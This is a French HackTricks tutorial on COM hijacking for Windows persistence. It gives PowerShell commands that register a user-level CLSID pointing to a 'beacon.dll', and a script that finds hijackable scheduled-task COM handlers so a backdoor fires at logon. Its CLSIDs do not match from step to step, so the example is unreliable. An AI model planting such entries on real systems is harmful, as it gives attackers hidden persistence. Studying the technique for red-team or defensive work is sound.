# COM Hijacking

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>

### Recherche de composants COM inexistants

Comme les valeurs de HKCU peuvent être modifiées par les utilisateurs, le **piratage COM** pourrait être utilisé comme un **mécanisme persistant**. En utilisant `procmon`, il est facile de trouver des registres COM recherchés qui n'existent pas et que l'attaquant pourrait créer pour persister. Filtres :

* Opérations **RegOpenKey**.
* où le _Résultat_ est **NOM NON TROUVÉ**.
* et le _Chemin_ se termine par **InprocServer32**.

Une fois que vous avez décidé quel COM inexistant impersonner, exécutez les commandes suivantes. _Soyez prudent si vous décidez d'usurper un COM qui se charge toutes les quelques secondes car cela pourrait être excessif._&#x20;
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Composants COM du Planificateur de tâches pouvant être détournés

Les tâches Windows utilisent des déclencheurs personnalisés pour appeler des objets COM et parce qu'ils sont exécutés via le Planificateur de tâches, il est plus facile de prédire quand ils seront déclenchés.

<pre class="language-powershell"><code class="lang-powershell"># Afficher les CLSID COM
$Tâches = Get-ScheduledTask

foreach ($Tâche in $Tâches)
{
if ($Tâche.Actions.ClassId -ne $null)
{
if ($Tâche.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Tâche.Principal.GroupId -eq $usersGroup)
{
Write-Host "Nom de la tâche: " $Tâche.TaskName
Write-Host "Chemin de la tâche: " $Tâche.TaskPath
Write-Host "CLSID: " $Tâche.Actions.ClassId
Write-Host
}
}
}
}

# Exemple de sortie :
<strong># Nom de la tâche:  Exemple
</strong># Chemin de la tâche:  \Microsoft\Windows\Exemple\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [plusieurs résultats similaires...]</code></pre>

En vérifiant la sortie, vous pouvez sélectionner une tâche qui sera exécutée **à chaque fois qu'un utilisateur se connecte**, par exemple.

Maintenant, en recherchant le CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** dans **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** et dans HKLM et HKCU, vous constaterez généralement que la valeur n'existe pas dans HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Ensuite, vous pouvez simplement créer l'entrée HKCU et à chaque fois que l'utilisateur se connecte, votre porte dérobée sera activée.

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'équipe rouge HackTricks AWS)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>
